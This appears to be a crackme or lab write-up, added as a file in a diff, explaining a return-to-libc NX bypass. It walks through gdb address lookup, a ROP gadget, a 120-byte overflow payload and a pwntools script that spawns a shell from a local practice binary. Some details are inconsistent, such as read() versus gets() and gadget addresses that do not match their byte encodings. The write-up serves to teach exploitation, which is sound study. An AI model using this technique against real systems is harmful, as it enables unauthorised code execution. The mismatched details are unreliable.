@@ -1,0 +1,233 @@
+NX - No eXecute is a feature that was introduced which would make certain
+portions of the stack non-executable, i.e. You couldn't execute on the portions
+of the stack marked with an NX bit. This makes it so that we cannot perform a 
+normal/usual stack overflow attack. 
+In my searching I found that there are two ways for dealing with NX, Lets call
+them: kill the NX bit and dodge the NX bit.
+Much of what we do is "dodging the NX bit". Killing the NX bit is where you
+invoke special function calls (?) to write over/delete the NX bits which mark the
+stack non-executable.
+
+Our goal in this crackmes is to bypass/dodge NX
+
+ASLR is disabled.
+
+Set the value in /proc/sys/kernel/randomize_va_space to 0 to disable ASLR
+
+Looking at the disassembly we see that there is a call to read() inorder to get 
+an input from the user. read() is almost the same as gets(), read() is used to 
+get a byte stream, whereas gets() is more appropriate for a text stream.
+This makes read() as dangerous as gets(). Reading the minimal assembly we can
+see that the binary was compiled from code like such:
+
+	#include <stdio.h>
+	#include <unistd.h>
+	#include <string.h>
+	
+	int main()
+	{
+		char buffer[40];
+		printf("Buffer: %p\n", &buffer);
+		gets(buffer);
+		printf(buffer);
+	
+		return 0;
+	}
+
+A classic stack overflow is where you'd take advantage of this unguarded read 
+into stack to over-write and execute shellcode, but since we can't execute code
+on the stack, We'll call an internal function from libc - system().
+libc is included almost with all binaries, it contains important functions like
+puts(), gets(), exit() and so on. When dynamically linked we can access system()
+When we call system() with the argument "/bin/sh" we evoke a shell.
+
+This specific type of expoit is known as return_to_libc.
+
+I'm using pwntools to interact with the binary, Inorder to provide the shell
+that we evoke with a stdin and stdout with ease. You could do it without
+the pwntools and feed it just the payload but I doubt you'd get the shell even
+if it works.
+
+Lets first understand how function calls work in the low level world.
+When a function is called, A stack frame is initialized for the function, it is
+used to keep track of local variables and the address to jump back to after
+execution of the function.
+
+	push    rbp
+	mov     rbp, rsp
+	sub     rsp, 0x70
+
+This is a usual way of initializing the stack frame, Think of it as creating a
+space in stack to deal with the current function, We first store the base pointer
+on top of the stack, then we move the current stack pointer as the base pointer
+then stretch out the space by 0x70 bytes in this case, creating our function
+environment.
+
+The following happens when a function is called like so: call func 
+
+	push rip
+	jmp func
+
+push rip: Pushes the current value of the instruction pointer (rip), which is 
+the address of the next instruction after the call instruction, onto the stack.
+After storing rip, we jump to the function.
+
+Once the stack frame is initialized, we perform our instructions and then when we
+have to perform clean up while returning: leave and ret come into place.
+
+leave:
+
+	mov rsp, rbp  ---> Moves the stack pointer back to base, destroying /
+                       deallocating memory. Almost sort of "crushing" the space
+					   we initially created.
+
+	pop rbp       ---> restores value of rbp from the top of the stack.
+
+ret:
+	
+	pop rip ---> pop off our stored pointer back to the host location from the
+			 	 top of the stack
+	jmp rip
+
+Memory during a function call looks something like this:
+
+	|||||||||||| buffer |||| RSP == RBP || RIP || Stack -> ....
+	                       |
+	           		Top of the stack
+
+We overflow buffer inorder to overwrite the return instruction pointer of main
+which is initially pointing to an exit functon somewhere, So that when main 
+returns, we can make it go wherever we want.
+
+We want to overwrite RIP to the clean-up function with the address of system()
+present in libc. 
+
+Run the binary in gdb and set a breakpoint somewhere, So that we can get the
+address of system(): (I'm using fake addresses in this write up)
+
+	(gdb) p system
+	$1 = {int (const char *)} 0x7ffff1111111 <__libc_system>
+
+That's the address of system inside libc, now we need the address of exit()
+to which we will redirect flow after we are done with our shell.
+
+	(gdb) p exit
+	$2 = {void (int)} 0x7ffff2222222 <__GI_exit>
+	
+Reading the man page for system() we see that:
+
+	NAME
+	       system - execute a shell command
+
+	SYNOPSIS
+
+    	   #include <stdlib.h>
+
+    	   int system(const char *command);
+
+system() takes in a string argument for the command to be executed. Which in
+our case would be "/bin/sh" which is actually very convenient as the string is
+already present in libc. The following command will get you the address of the
+string:
+
+	(gdb) find &system, +99999999, "/bin/sh"
+	0x7ffff3333333
+	warning: Unable to access 16000 bytes of target memory at 0x7ffff7f97880,
+	halting search.
+	1 pattern found.
+
+Now that we have all of our main ingredients for the attack, Lets see how we're
+going to assemble it. 
+
+In 64 bit systems, A function call requires you to pass arguments to functions
+using registers in a specific order: rdi, rsi, etc.. In our case we have to set
+rdi's value to the memory address of our "/bin/sh" string. In order to do this
+we use ROP gadgets: Small bits of instructions present in the binary stitched
+together to perform certain tasks. I'll explain more at the end of the next para.
+
+There is something called stack alignment, Its when the data is stored in 
+the stack at addresses that are a multiple of 4 (4 byte alignment), 8 (8 byte 
+alignment) and 16 (16 byte alignment). Some functions require you to have a 
+specific stack alignment, Everytime you return from a function you pop off
+a value from the stack, hence altering the stack alignment. Inorder to align
+the stack as we prefer we need to use false returns. We can use any return 
+instruction from the binary for this purpose, These short instructions used for
+such specific purposes are called ROP (Return Oriented Programming) Gadgets.
+You can use a tool called ROPgadgets to extract these useful instructions from
+your binary.
+
+Running ROPgadget on our binary here gives us the following output:
+
+	ROPgadget --binary ./nx-bypass | grep rdi
+	
+	0x0000000000XXXXXX : fisubr dword ptr [rdi] ; add byte ptr ....
+
+	0x0000000000AAAAA1 : pop rdi ; ret <----- this is what we need
+
+The second gadget lets us pop a value off the top of the stack into rdi and ret.
+These two instructions are present as such:
+
+	0x0000000000AAAAA1 : pop rdi
+	0x0000000000AAAAAA2 : ret
+
+So we can use the same gadgets for both the purpose of stack aligning and to fill
+in our argument.
+
+Constructing our payload:
+
+In our specific binary we need 120 bytes of random data before we reach our stored
+instruction pointer. So the first part of our payload would be 120 'A's:
+	
+	payload = 120*'A'
+
+Once we reach the return pointer, we first overwrite it to the address of our ROP
+gadget which aligns our stack which would be: ret alone
+
+You have to note that the way you align your stack might be different, Trial and 
+error is a must. (?)
+Addresses are reversed due to little endian-ness.
+
+	payload = 120*'A' + "\xa2\xaa\xaa\x0a\x00\x00\x00\x00"
+
+After aligning our stack we have to pop the value off the top of the stack pointing
+to our command string into rdi. We will structure our payload from here in the
+following way:
+	
+	Address of ROPgadget to pop into rdi and return to system()
+
+	Address to our command string
+
+	Address of system() which ret will use to jmp to
+	
+	Address of exit() which system() will call when it returns
+
+Now our constructed payload looks like such:
+	
+	buf = "A"*120 + "\xa2\xaa\xaa\x0a\x00\x00\x00\x00" \
+	              + "\xa1\xaa\xaa\x0a\x00\x00\x00\x00" \
+	              + "\x33\x33\x33\xf3\xff\x7f\x00\x00" \
+	              + "\x11\x11\x11\xf1\xff\x7f\x00\x00" \
+	              + "\x22\x22\x22\xf2\xff\x7f\x00\x00"
+
+When instruction is redirected to ret initally, it pops the first value off the stack
+into RIP and jumps to RIP, which would just be 0x0AAAAAA1, Once reaching the next ROP
+gadget, It pops the next value on top of the stack into RDI, which would be the address
+to our command string, ret will pop the next value into RIP and jump to it, which would
+be the address to our system() function, Once all execution is complete, we redirect to
+exit()
+
+Writing this in python using pwntools, we get the following exploit:
+
+	from pwn import *
+
+	buf = "A"*120 + "\xa2\xaa\xaa\x0a\x00\x00\x00\x00" \
+	              + "\xa1\xaa\xaa\x0a\x00\x00\x00\x00" \
+	              + "\x33\x33\x33\xf3\xff\x7f\x00\x00" \
+	              + "\x11\x11\x11\xf1\xff\x7f\x00\x00" \
+	              + "\x22\x22\x22\xf2\xff\x7f\x00\x00"
+
+	target = process("./nx-bypass")
+	target.send(buf)
+	target.interactive()
+	
+This gives us a shell! We have solved the crackmes.
